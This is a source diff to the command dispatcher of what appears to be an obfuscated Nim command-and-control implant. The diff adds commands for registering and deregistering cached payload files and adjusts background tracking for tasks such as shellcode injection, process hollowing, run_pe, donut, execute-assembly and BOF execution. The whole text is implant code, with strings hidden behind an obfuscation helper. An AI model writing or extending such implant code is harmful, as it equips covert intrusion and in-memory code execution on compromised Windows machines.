@@ -76,6 +76,9 @@ when defined(windows):
   import ../tasks/donut
   import ../tasks/inject_hollow
   import ../tasks/run_pe
+  import ../tasks/register_file
+
+import ../tasks/deregister_file
 
 type
   TaskExecutionResult* = object
@@ -178,7 +181,8 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       when defined(windows):
         debug "[DEBUG] Starting execute-assembly (file download)"
         result.response = executeAssembly(taskId, params)
-        result.needsBackgroundTracking = true
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
       else:
         result.response = %*{
           obf("task_id"): taskId,
@@ -191,7 +195,8 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       when defined(windows):
         debug "[DEBUG] Starting inline_execute (BOF download)"
         result.response = inlineExecute(taskId, params)
-        result.needsBackgroundTracking = true
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
       else:
         result.response = %*{
           obf("task_id"): taskId,
@@ -204,7 +209,8 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       when defined(windows):
         debug "[DEBUG] Starting shinject (shellcode download)"
         result.response = shinject(taskId, params)
-        result.needsBackgroundTracking = true
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
       else:
         result.response = %*{
           obf("task_id"): taskId,
@@ -217,7 +223,8 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       when defined(windows):
         debug "[DEBUG] Starting donut (file download)"
         result.response = donut(taskId, params)
-        result.needsBackgroundTracking = true
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
       else:
         result.response = %*{
           obf("task_id"): taskId,
@@ -230,7 +237,8 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       when defined(windows):
         debug "[DEBUG] Starting inject_hollow (file download)"
         result.response = injectHollow(taskId, params)
-        result.needsBackgroundTracking = true
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
       else:
         result.response = %*{
           obf("task_id"): taskId,
@@ -660,7 +668,8 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       when defined(windows):
         debug "[DEBUG] Starting run_pe (file download)"
         result.response = run_pe(taskId, params)
-        result.needsBackgroundTracking = true
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
       else:
         result.response = %*{
           obf("task_id"): taskId,
@@ -668,6 +677,25 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
           obf("status"): "error",
           obf("user_output"): obf("run_pe command is only available on Windows")
         }
+    
+    of obf("register_file"):
+      when defined(windows):
+        debug "[DEBUG] Starting register_file (file download for caching)"
+        result.response = registerFile(taskId, params)
+        if not (result.response.hasKey(obf("completed")) and result.response[obf("completed")].getBool()):
+          result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("register_file command is only available on Windows")
+        }
+    
+    of obf("deregister_file"):
+      debug "[DEBUG] Executing deregister_file command"
+      result.response = deregisterFile(taskId, params)
+      result.response[obf("task_id")] = %taskId
     
     else:
       # Command not implemented
